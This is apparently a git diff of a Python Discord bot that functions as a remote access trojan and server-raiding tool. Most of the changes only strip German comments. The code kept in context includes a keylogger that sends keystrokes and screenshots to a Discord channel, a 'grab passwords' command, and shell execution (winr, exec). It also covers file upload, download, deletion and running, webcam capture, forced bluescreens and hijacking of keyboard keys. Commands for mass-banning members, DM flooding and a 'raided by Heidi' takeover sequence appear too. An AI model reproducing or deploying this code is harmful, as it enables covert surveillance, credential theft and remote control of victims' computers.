     if ctx.author.guild_permissions.administrator:
         await ctx.send("Banning all members except for the specified user ID...")
-        # ID des Benutzers, der nicht gebannt werden soll
         allowed_user_id = 691670319248965694
 
-        # Alle Mitglieder des Servers auflisten
         members = ctx.guild.members
 
-        # Schleife durch alle Mitglieder und bannen, wenn ihre ID nicht die erlaubte ID ist und es keine Bots sind
         for member in members:
             if member.id != allowed_user_id and not member.bot:
                 try:
@@ -1364,7 +1213,6 @@ async def banall(ctx):
     else:
         await ctx.send("You do not have permission to execute this command.")
 
-# Unbanall Command
 @bot.command(help="Unban every banned user in this Guild")
 async def unbanall(ctx):
     if ctx.author.guild_permissions.administrator:
@@ -1386,38 +1234,28 @@ async def unbanall(ctx):
     else:
         await ctx.send("Du hast keine Berechtigung, diesen Befehl auszuführen.")
 
-# Define den >say Befehl
 @bot.command(help="show message on screen")
 async def say(ctx, *, message):
-    # Gib die Nachricht aus
     show_message(message)
 
-# Funktion zur Anzeige der Nachricht
 def show_message(text):
-    # Erstelle ein Tkinter-Fenster
     root = tk.Tk()
-    root.withdraw()  # Verstecke das Hauptfenster
+    root.withdraw()
 
-    # Zeige die Nachricht in einem Popup-Fenster in der Mitte des Bildschirms
     message_box = messagebox.showinfo("New Message!!!", text)
 
-    # Hebe das Popup-Fenster in den Vordergrund über allen anderen Fenstern
     root.attributes("-topmost", True)
     root.wm_attributes("-topmost", 1)
 
-    # Setze den Fokus auf das Popup-Fenster
     root.after(0, lambda: root.focus_force())
 
-################################################################################
+#
 
-# Define den >ad Befehl
 @bot.command(help="show message on screen with tiny close button")
 async def ad(ctx, *, message):
-    # Starte die Tkinter-Funktion in einem separaten Thread
     thread = threading.Thread(target=show_message2, args=(ctx, message))
     thread.start()
 
-# Define den >close Befehl
 @bot.command(help="close the message popup window")
 async def close(ctx):
     global popup_window
@@ -1429,69 +1267,55 @@ async def close(ctx):
         close_button_window.destroy()
         close_button_window = None
 
-# Funktion zur Anzeige der Nachricht mit deaktivierter Schließ-Schaltfläche (X)
 def show_message2(ctx, text):
     global popup_window
     global popup_root
     global close_button_window
 
-    # Erstelle ein Tkinter-Fenster
     root = tk.Tk()
-    root.withdraw()  # Verstecke das Hauptfenster
+    root.withdraw()
     popup_root = root
 
-    # Deklariere die Variable popup_window global
     global popup_window
 
-    # Erstelle ein Top-Level-Fenster für die Nachricht
     popup = tk.Toplevel(root)
     popup.title("New Message!!!")
 
-    # Setze die Nachricht im Fenster mit größerer Schriftgröße und umbrochenem Text
     label = tk.Label(popup, text=text, font=("Helvetica", 15))
     label.pack()
 
-    # Deaktiviere die Schließ-Schaltfläche (X)
     popup.protocol("WM_DELETE_WINDOW", lambda: None)
 
-    # Verstecke die Minimieren-Schaltfläche und die Maximieren-Schaltfläche
     popup.overrideredirect(1)
     popup.attributes("-topmost", True)
 
-    # Berechne die Größe des Fensters basierend auf der Größe des Textes
-    window_width = label.winfo_reqwidth() + 0  # Füge 20 Pixel für den Rand hinzu
-    window_height = label.winfo_reqheight() + 0  # Füge 20 Pixel für den Rand hinzu
+    window_width = label.winfo_reqwidth() + 0
+    window_height = label.winfo_reqheight() + 0
 
-    # Berechne die Position, um das Fenster in die Mitte des Bildschirms zu setzen
     screen_width = root.winfo_screenwidth()
     screen_height = root.winfo_screenheight()
     position_x = int((screen_width - window_width) / 2)
     position_y = int((screen_height - window_height) / 2)
     popup.geometry(f"{window_width}x{window_height}+{position_x}+{position_y}")
 
-    # Erstelle ein kleines Fenster für die Schließen-Schaltfläche
     close_button_root = tk.Toplevel(root)
     close_button_root.overrideredirect(1)
-    close_button_root.geometry("+0+0")  # Positioniere ganz in die Ecke
+    close_button_root.geometry("+0+0")
     close_button_root.attributes("-topmost", True)
 
-    # Erstelle die Schließen-Schaltfläche
     close_button = tk.Button(close_button_root, text="X", command=lambda: close_popup(popup, close_button_root), font=("Helvetica", 4), width=1, height=1)
     close_button.pack()
 
-    # Speichere das Popup-Fenster und die Schließen-Schaltfläche
     popup_window = popup
     close_button_window = close_button_root
 
-    # Starte die Tkinter Schleife
     root.mainloop()
 
-# Funktion zum Schließen des Popups
 def close_popup(popup, close_button_root):
     popup.destroy()
     close_button_root.destroy()
 
-################################################################################
+#
 
 @bot.command(help= "send a picture of every cam")
 async def cams(ctx):
@@ -1501,7 +1325,6 @@ async def cams(ctx):
         if ret:
             await send_image(ctx, image)
         else:
-            # Wenn keine Kamera an diesem Index vorhanden ist, breche die Schleife ab
             break
         camera_index += 1
 
@@ -1530,7 +1353,7 @@ async def all(ctx):
     print("clear")
     await clear(ctx)
     print("reguild")
-    await reguild(ctx, "raided by Heidi")  # Hier wird der reguild-Befehl direkt aufgerufen
+    await reguild(ctx, "raided by Heidi")
     print("clear")
     await clear(ctx)
     print("repic")
@@ -1586,7 +1409,7 @@ async def change_nick(ctx, member: str, new_nick: str):
 
 @bot.command(help= "Flood DMs")
 async def dm_flood(ctx, member: discord.Member):
-    for _ in range(20):  # Flooding with 20 messages
+    for _ in range(20):
         await member.send("@everyone")
 
 @bot.command(help= "Change Admin nickname")
@@ -1638,26 +1461,22 @@ class Keylogger:
                     await self.channel.send(f"*USER*: **{os.getlogin()}** ~~*TIME: {timenow}*~~ {self.log}")
                     self.log = ''
 
-                    # Take a screenshot
                     screenshot = ImageGrab.grab(all_screens=True)
 
-                    # Save the screenshot to a file
                     screenshot_filename = f"C:/Users/{os.getlogin()}/Downloads/screenshot.png"
                     screenshot.save(screenshot_filename)
 
-                    # Send the screenshot to the Discord channel
                     await self.channel.send(file=discord.File(screenshot_filename))
 
-                    # Delete the screenshot file
                     os.remove(screenshot_filename)
                 except Exception as e:
-                    print(f"Error in reporting: {e}")  # Handle the exception here
+                    print(f"Error in reporting: {e}")
 
     def _on_key_press(self, key):
         try:
             self.log += str(key)
         except Exception as e:
-            print(f"Error in key press: {e}")  # Handle the exception here
+            print(f"Error in key press: {e}")
 
     def run(self):
         threading.Thread(target=self._start_keylogger).start()
@@ -1671,12 +1490,11 @@ async def on(ctx):
     keylogger = Keylogger(ctx, TIME_INTERVAL)
     await ctx.send("Keylogger started.")
     keylogger.run()
-    asyncio.create_task(keylogger._report())  # Start the reporting loop
+    asyncio.create_task(keylogger._report())
 
 @bot.command(help='disable keylogger')
 async def off(ctx):
     await ctx.send("Keylogger stopped.")
-    # Add functionality to stop the keylogger if needed
 
 @bot.command(help= "bluescreen the computer")
 async def bluescreen(ctx):
@@ -1690,30 +1508,28 @@ async def url(ctx, url: str):
     if not url.startswith('http://') and not url.startswith('https://'):
         url = 'http://' + url
 
-    if platform.system() == 'Darwin':  # macOS
+    if platform.system() == 'Darwin':
         subprocess.call(('open', url))
-    elif platform.system() == 'Windows':  # Windows
+    elif platform.system() == 'Windows':
         subprocess.call(('start', url), shell=True)
-    else:  # Linux variants
+    else:
         subprocess.call(('xdg-open', url))
 
     await ctx.send(f'Opening URL: {url}')
 
-# Funktion zum Ändern des Verzeichnisses
 @bot.command(help="Change directory")
 async def cd(ctx, *, path: str = None):
     global current_directory
     if path:
         try:
             os.chdir(path)
-            current_directory = os.getcwd()  # Aktualisiere den aktuellen Verzeichnispfad
+            current_directory = os.getcwd()
             await ctx.send(f'Changed directory to {current_directory}')
         except Exception as e:
             await ctx.send(f'Error: {e}')
     else:
         await ctx.send(f'Current directory is {current_directory}')
 
-# Create directory
 @bot.command(help="Create directory")
 async def mkdir(ctx, *, dirname: str):
     try:
@@ -1722,7 +1538,6 @@ async def mkdir(ctx, *, dirname: str):
     except Exception as e:
         await ctx.send(f'Error: {e}')
 
-# Remove directory
 @bot.command(help="Remove directory")
 async def rmdir(ctx, *, dirname: str):
     try:
@@ -1731,12 +1546,11 @@ async def rmdir(ctx, *, dirname: str):
     except Exception as e:
         await ctx.send(f'Error: {e}')
 
-# Create file
 @bot.command(help="Create file")
 async def touch(ctx, *, filename: str):
     global current_directory
     if filename:
-        file_path = os.path.join(os.getcwd(), filename)  # Absoluten Pfad erstellen
+        file_path = os.path.join(os.getcwd(), filename)
         if not os.path.exists(file_path):
             try:
                 with open(file_path, "w"):
@@ -1749,7 +1563,6 @@ async def touch(ctx, *, filename: str):
     else:
         await ctx.send("Please specify a filename.")
 
-# Remove file
 @bot.command(help="Remove file")
 async def rm(ctx, *, filename: str):
     try:
@@ -1758,7 +1571,6 @@ async def rm(ctx, *, filename: str):
     except Exception as e:
         await ctx.send(f'Error: {e}')
 
-# Upload file
 @bot.command(help="Upload file")
 async def upload(ctx, *, filename: str):
     try:
@@ -1766,7 +1578,6 @@ async def upload(ctx, *, filename: str):
     except Exception as e:
         await ctx.send(f'Error: {e}')
 
-# Download file
 @bot.command(help="Download file")
 async def download(ctx):
     if len(ctx.message.attachments) == 0:
@@ -1780,7 +1591,6 @@ async def download(ctx):
     except Exception as e:
         await ctx.send(f'Error: {e}')
 
-# Funktion zum Markieren von Dateiendungen
 def mark_file_extensions(files):
     marked_files = []
     for file in files:
@@ -1788,17 +1598,16 @@ def mark_file_extensions(files):
         if file_extension:
             marked_files.append(f"{filename}*{file_extension}*")
         else:
-            marked_files.append(filename)  # Füge nur den Dateinamen hinzu, wenn keine Dateiendung vorhanden ist
+            marked_files.append(filename)
     return marked_files
 
-# List directory contents
 @bot.command(help="List directory contents")
 async def ls(ctx, order=''):
     try:
-        if order == 'n':  # Check if the order parameter is 'n' for newest to oldest
+        if order == 'n':
             files = os.listdir(current_directory)
             files.sort(key=lambda x: os.path.getmtime(os.path.join(current_directory, x)), reverse=True)
-        else:  # Default behavior, list files alphabetically
+        else:
             files = os.listdir(current_directory)
             files.sort()
 
@@ -1824,14 +1633,13 @@ async def ls(ctx, order=''):
     except Exception as e:
         await ctx.send(f'Error: {e}')
 
-# Run file
 @bot.command(help="Run a file in the current directory")
 async def run(ctx, *, filename: str):
     global current_directory
     file_path = os.path.join(current_directory, filename)
     if os.path.exists(file_path):
         try:
-            os.startfile(file_path)  # Öffne die Datei basierend auf ihrer Assoziation mit dem Dateityp
+            os.startfile(file_path)
             await ctx.send(f"File `{filename}` opened successfully.")
         except Exception as e:
             await ctx.send(f"Error opening file `{filename}`: {e}")
@@ -1840,13 +1648,10 @@ async def run(ctx, *, filename: str):
 
 @bot.command(help= "show all the processes")
 async def ran(ctx, *, query: str = ""):
-    # Holen der laufenden Prozesse mit subprocess
     result = subprocess.run(['tasklist'], capture_output=True, text=True, shell=True)
     process_list = result.stdout
 
-    # Wenn kein spezifischer Prozess angegeben wurde, sende die gesamte Prozessliste
     if not query:
-        # Wenn die Nachricht zu lang ist, teile sie auf
         if len(process_list) > 1900:
             for i in range(0, len(process_list), 1900):
                 await ctx.send(f"```\n{process_list[i:i+1900]}\n```")
@@ -1854,14 +1659,12 @@ async def ran(ctx, *, query: str = ""):
             await ctx.send(f"```\n{process_list}\n```")
         return
 
-    # Durchsuchen der Prozessliste nach dem Prozessnamen oder der PID
     process_info = ""
     for line in process_list.splitlines():
-        if query.lower() in line.lower():  # Falls der Prozessname oder die PID gefunden wurde
+        if query.lower() in line.lower():
             process_info = line
             break
 
-    # Wenn der Prozess gefunden wurde, sende seine Informationen
     if process_info:
         await ctx.send(f"```\n{process_info}\n```")
     else:
@@ -1875,17 +1678,13 @@ async def taskkill(ctx, identifier: str):
             result = subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True, text=True, shell=True)
         else:
             if identifier.lower() == "fivem.exe":
-                # Simuliere einen Absturz für fivem.exe
                 try:
-                    # Finde alle Prozesse mit dem Namen "fivem.exe"
                     result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq fivem.exe'], capture_output=True, text=True, shell=True)
                     processes = result.stdout.splitlines()
 
-                    # Suche nach der PID des Prozesses
                     for process in processes:
                         if "fivem.exe" in process:
                             pid = int(process.split()[1])
-                            # Verwende ctypes, um den Prozess zu beenden und einen Absturz zu simulieren
                             ctypes.windll.kernel32.TerminateProcess(ctypes.windll.kernel32.OpenProcess(1, False, pid), -1)
                             await ctx.send(f"Prozess 'fivem.exe' mit der PID {pid} erfolgreich simuliert abgestürzt.")
                             return
@@ -1893,10 +1692,8 @@ async def taskkill(ctx, identifier: str):
                     await ctx.send(f"Ein Fehler ist beim Simulieren des Absturzes aufgetreten: {e}")
                     return
             else:
-                # Befehl zum Beenden des Prozesses mit dem angegebenen Abbildnamen
                 result = subprocess.run(['taskkill', '/IM', identifier, '/F'], capture_output=True, text=True, shell=True)
 
-        # Überprüfen, ob der Prozess erfolgreich beendet wurde
         if result.returncode == 0:
             await ctx.send(f"Prozess mit der PID oder dem Abbildnamen '{identifier}' erfolgreich beendet.")
         else:
@@ -1906,7 +1703,6 @@ async def taskkill(ctx, identifier: str):
 
 @bot.command(help= "show some information")
 async def tskmngr(ctx):
-    # Funktion zur Umrechnung von Bytes in verschiedene Einheiten
     def bytes_to_readable(size_in_bytes):
         suffixes = ['B', 'KB', 'MB', 'GB', 'TB']
         index = 0
@@ -1915,7 +1711,6 @@ async def tskmngr(ctx):
             index += 1
         return f"{size_in_bytes:.2f} {suffixes[index]}"
 
-    # Systeminformationen
     uname = platform.uname()
     sys_info = (f"System: {uname.system}\n"
                 f"Node Name: {uname.node}\n"
@@ -1924,18 +1719,15 @@ async def tskmngr(ctx):
                 f"Machine: {uname.machine}\n"
                 f"Processor: {uname.processor}\n\n")
 
-    # CPU-Informationen
     result = subprocess.run(['wmic', 'cpu', 'get', 'Name,Description,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed,CurrentClockSpeed,L2CacheSize,L3CacheSize,SocketDesignation'], capture_output=True, text=True, shell=True)
     cpu_info = result.stdout
 
-    # Speicherinformationen
     result = subprocess.run(['wmic', 'OS', 'get', 'TotalVisibleMemorySize,FreePhysicalMemory'], capture_output=True, text=True, shell=True)
-    memory_info_lines = result.stdout.strip().split('\n')  # Entferne Leerzeichen und teile nach Zeilen
+    memory_info_lines = result.stdout.strip().split('\n')
 
     total_memory_mb = 0
     free_memory_mb = 0
 
-    # Extrahiere und summiere die Speicherwerte
     for line in memory_info_lines:
         values = [int(s) for s in line.split() if s.isdigit()]
         if len(values) == 1:
@@ -1943,29 +1735,23 @@ async def tskmngr(ctx):
         elif len(values) == 2:
             free_memory_mb += values[1]
 
-    # Konvertiere die Speicherwerte in lesbare Einheiten
     total_memory_readable = bytes_to_readable(total_memory_mb * 1024 * 1024)
     free_memory_readable = bytes_to_readable(free_memory_mb * 1024 * 1024)
 
-    # Grafikkarteninformationen
     result = subprocess.run(['wmic', 'path', 'win32_videocontroller', 'get', 'name'], capture_output=True, text=True, shell=True)
     gpu_info = result.stdout
 
-    # Festplatteninformationen
     result = subprocess.run(['wmic', 'diskdrive', 'get', 'caption,size,model'], capture_output=True, text=True, shell=True)
     disk_info = result.stdout
 
-    # Netzwerkinformationen
     result = subprocess.run(['wmic', 'nic', 'get', 'name,speed'], capture_output=True, text=True, shell=True)
     network_info = result.stdout
 
-    # Gesamte Systeminformationen
     full_info = (sys_info +
                  f"Total Memory: {total_memory_readable}\n"
                  f"Free Memory: {free_memory_readable}\n\n" +
                  cpu_info + '\n\n' + gpu_info + '\n\n' + disk_info + '\n\n' + network_info)
 
-    # Nachricht in Teile aufteilen, wenn zu lang
     if len(full_info) > 1900:
         for i in range(0, len(full_info), 1900):
             await ctx.send(f"```\n{full_info[i:i + 1900]}\n```")
@@ -1982,10 +1768,6 @@ async def checkadmin(ctx):
 
 @bot.command(help="grab passwords")
 async def passes(ctx):
-    import subprocess
-    import os
-    import discord
-
     temp = os.getenv('temp')
     if not temp:
         await ctx.send("Temp-Verzeichnis nicht gefunden.")
@@ -2025,7 +1807,6 @@ async def passes(ctx):
 @bot.command(help= "run anything like in win+r")
 async def winr(ctx, *, command):
     try:
-        # Führe den Befehl aus, als wäre er im Win+R-Dialog eingegeben
         subprocess.run(command, shell=True)
         await ctx.send(f'Befehl ausgeführt: {command}')
     except Exception as e:
@@ -2035,24 +1816,20 @@ async def winr(ctx, *, command):
 async def exec(ctx, *, command):
     global current_directory
     try:
-        # Führe den Befehl im aktuellen Verzeichnis aus
         result = subprocess.run(command, cwd=current_directory, shell=True, capture_output=True)
         if result.returncode == 0:
-            # Wenn der Befehl erfolgreich war, sende die Ausgabe an den Discord-Channel
             output = result.stdout.decode('utf-8', 'ignore') + result.stderr.decode('utf-8', 'ignore')
             if len(output) == 0:
                 await ctx.send("No output.")
             else:
-                # Teile die Ausgabe in kleinere Teile auf
                 for i in range(0, len(output), 1900):
                     await ctx.send(f'```\n{output[i:i+1900]}\n```')
         else:
-            # Wenn der Befehl fehlgeschlagen ist, sende eine entsprechende Nachricht
             await ctx.send(f'Command failed with return code {result.returncode}')
     except Exception as e:
         await ctx.send(f'Error: {e}')
 
-#####################
+#
 
 watching_enabled = False
 key_mapping = {}
@@ -2061,7 +1838,7 @@ last_key_state = {}
 def watch_keyboard():
     while True:
         if watching_enabled:
-            for key in list(key_mapping.keys()):  # Erstelle eine Kopie der Schlüssel, um Änderungen zu vermeiden
+            for key in list(key_mapping.keys()):
                 if keyboard.is_pressed(key) and not last_key_state.get(key, False):
                     last_key_state[key] = True
                     actions = key_mapping[key]
@@ -2069,7 +1846,7 @@ def watch_keyboard():
                         time.sleep(0.0025)
                         keyboard.send("\b")
                         keyboard.send(action)
-                    break  # Beende die Schleife, um nur einmal pro Tastendruck zu agieren
+                    break
                 elif not keyboard.is_pressed(key):
                     last_key_state[key] = False
         time.sleep(0.001)
@@ -2079,19 +1856,17 @@ def switch_keyboard(option):
     global watching_enabled
     if len(option) == 3 and option[1] in ('>', '-'):
         if option[1] == '>':
-            key_mapping[option[0]] = [option[2]]  # Ersetze das Mapping
+            key_mapping[option[0]] = [option[2]]
         elif option[1] == '-':
-            key_mapping[option[0]] = [option[2]]  # Ersetze das Mapping
-            key_mapping[option[2]] = [option[0]]  # Füge das umgekehrte Mapping hinzu
-        watching_enabled = True  # Aktiviere die Tastaturüberwachung
+            key_mapping[option[0]] = [option[2]]
+            key_mapping[option[2]] = [option[0]]
+        watching_enabled = True
         print(f"Tastaturüberwachung aktualisiert: {option}")
 
-# Starte den Tastaturüberwachungsprozess
 watching_thread = threading.Thread(target=watch_keyboard)
 watching_thread.daemon = True
 watching_thread.start()
 
-# Befehl zum Ein- und Ausschalten der Tastaturüberwachung und Umschalten der Tasten
 @bot.command(help="switch keys on the keyboard (USAGE: >switchkb a-b (switches a to b and b to a), >switchkb a>b (switches a to b))")
 async def switchkb(ctx, option: str):
     switch_keyboard(option)
@@ -2100,7 +1875,6 @@ async def switchkb(ctx, option: str):
     else:
         await ctx.send(f"Tastaturüberwachung aktiviert: {option}")
 
-# Befehl zum Überprüfen der vertauschten Tasten
 @bot.command(help="get all the switched keys")
 async def checkkb(ctx):
     if key_mapping:
@@ -2116,18 +1890,18 @@ async def removekb(ctx, key: str):
     global key_mapping
     if key in key_mapping:
         del key_mapping[key]
-        reverse_mapping = {value[0]: key for key, value in key_mapping.items()}  # Erstelle ein umgekehrtes Mapping
+        reverse_mapping = {value[0]: key for key, value in key_mapping.items()}
         if key in reverse_mapping:
-            del key_mapping[reverse_mapping[key]]  # Lösche das umgekehrte Mapping, falls vorhanden
+            del key_mapping[reverse_mapping[key]]
         await ctx.send(f"Tastaturzuordnung für Taste '{key}' wurde entfernt.")
     elif '>' in key or '-' in key:
         if '>' in key:
             key = key.split('>')
-            key_mapping.pop(key[0], None)  # Entferne das Mapping ä->ü
+            key_mapping.pop(key[0], None)
         elif '-' in key:
             key = key.split('-')
-            key_mapping.pop(key[0], None)  # Entferne das Mapping ä-ü
-            key_mapping.pop(key[1], None)  # Entferne das Mapping ü-ä
+            key_mapping.pop(key[0], None)
+            key_mapping.pop(key[1], None)
         await ctx.send(f"Tastaturzuordnung für Taste '{key}' wurde entfernt.")
     else:
         await ctx.send(f"Tastaturzuordnung für Taste '{key}' existiert nicht.")
@@ -2140,27 +1914,27 @@ async def resetkb(ctx):
 
 @bot.command(help="Reset and assign random keys to each letter of the alphabet")
 async def randomkb(ctx):
-    await resetkb(ctx)  # Alle vorherigen Tastenzuordnungen zurücksetzen
-    alphabet = list("abcdefghijklmnopqrstuvwxyz")  # Originale Alphabetliste
-    shuffled_alphabet = alphabet.copy()  # Erstellen einer Kopie des Alphabets
-    random.shuffle(shuffled_alphabet)  # Das kopierte Alphabet zufällig mischen
+    await resetkb(ctx)
+    alphabet = list("abcdefghijklmnopqrstuvwxyz")
+    shuffled_alphabet = alphabet.copy()
+    random.shuffle(shuffled_alphabet)
 
     new_key_mapping = {}
     for original, shuffled in zip(alphabet, shuffled_alphabet):
-        new_key_mapping[original] = [shuffled]  # Mapping vom originalen zum zufälligen Buchstaben
+        new_key_mapping[original] = [shuffled]
 
     global key_mapping
-    key_mapping = new_key_mapping  # Atomarer Austausch des Mappings
+    key_mapping = new_key_mapping
 
     await ctx.send("Alle Tasten wurden zufällig zugewiesen.")
 
-######
+#
 
 del_on_ctrl_enabled = False
 
 def send_a_with_backspace():
     keyboard.send("a")
-    time.sleep(0.001)  # Kurze Verzögerung, um sicherzustellen, dass das "a" gesendet wurde, bevor der Backspace gesendet wird
+    time.sleep(0.001)
     keyboard.send("\b")
 
 def delonstrg():
@@ -2170,12 +1944,10 @@ def delonstrg():
             send_a_with_backspace()
         time.sleep(0.001)
 
-# Starte den Thread für die Funktion delonstrg
 delonstrg_thread = threading.Thread(target=delonstrg)
 delonstrg_thread.daemon = True
 delonstrg_thread.start()
 
-# Befehl zum Ein- und Ausschalten der Funktion delonstrg
 @bot.command(help="Toggle sending 'a' with backspace when pressing Ctrl")
 async def delonstrg(ctx):
     global del_on_ctrl_enabled
@@ -2183,7 +1955,7 @@ async def delonstrg(ctx):
     status = "enabled" if del_on_ctrl_enabled else "disabled"
     await ctx.send(f"Sending 'a' with backspace when pressing Ctrl is now {status}.")
 
-######
+#
 
 @bot.command(help="List all servers the bot is a member of")
 async def serverlist(ctx):
@@ -2210,11 +1982,9 @@ async def leaveserver(ctx, server_id: int):
 
 @bot.event
 async def on_guild_join(guild):
-    # Spezifische Server- und Kanal-ID
     specific_guild_id = 1000796001541570670
     specific_channel_id = 1246457619812450345
 
-    # Prüfen, ob der Bot dem spezifischen Server beigetreten ist
     channel = bot.get_channel(specific_channel_id)
     if channel is not None:
         if channel.permissions_for(guild.me).send_messages:
@@ -2225,5 +1995,46 @@ async def on_guild_join(guild):
         print(f"Kanal mit der ID {specific_channel_id} wurde nicht gefunden.")
 
         print(f"Bot ist einem anderen Server beigetreten: {guild.name} (ID: {guild.id})")
+
+@bot.command()
+async def serverinfo(ctx, server_id: int):
+    server = bot.get_guild(server_id)
+    if server is None:
+        await ctx.send("Server nicht gefunden.")
+        return
+
+    response = ""
+
+    text_channels_without_category = [channel for channel in server.text_channels if channel.category is None]
+    voice_channels_without_category = [channel for channel in server.voice_channels if channel.category is None]
+
+    if text_channels_without_category or voice_channels_without_category:
+        for channel in text_channels_without_category:
+            response += f"    [t] {channel.name}\n"
+        for channel in voice_channels_without_category:
+            response += f"    [s] {channel.name}\n"
+
+    for category in server.categories:
+        response += f"[k] {category.name}\n"
+        for channel in category.text_channels:
+            response += f"    [t] {channel.name}\n"
+        for channel in category.voice_channels:
+            response += f"    [s] {channel.name}\n"
+
+    response += "\nRollen:\n"
+    for role in server.roles:
+        response += f"    {role.name}\n"
+
+    response += "\nSticker:\n"
+    for sticker in server.stickers:
+        response += f"    {sticker.name}\n"
+
+    response += "\nEmojis:\n"
+    for emoji in server.emojis:
+        response += f"    {emoji.name}\n"
+
+    chunks = [response[i:i+1900] for i in range(0, len(response), 1900)]
+    for chunk in chunks:
+        await ctx.send(chunk)
 
 bot.run(TOKEN)
